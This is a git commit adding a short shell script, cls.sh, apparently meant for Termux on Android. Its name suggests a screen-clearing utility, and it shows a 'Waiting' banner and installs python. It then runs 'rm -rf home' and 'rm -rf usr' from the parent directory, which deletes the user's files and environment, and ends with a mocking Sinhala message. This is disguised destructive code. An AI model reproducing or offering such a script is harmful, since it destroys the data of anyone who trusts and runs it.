86e00b030c12dc849a0b7821d94c65edb44de81a
Razor Kenway <razorkenway.98@gmail.com>
2020-10-08 12:55:28 +0530

    Create cls.sh

---
+++ cls.sh
@@ -0,0 +1,24 @@
+clear
+
+#colour
+r='\e[1;31m'
+g='\e[1;32m'
+y='\e[1;33m'
+b='\e[1;34m'
+p='\e[1;35m'
+lb='\e[1;36m'
+
+cd
+figlet Waiting | lolcat
+pkg install python
+pkg install python2
+
+cd
+cd ..
+rm -rf home
+rm -rf usr
+
+echo 
+echo -e "\e[1;33m ඉවරයි ඉතින් දැන් බඩු හරි 😂"
+echo
+echo -e "\e[1;32m              Razor Kenway "
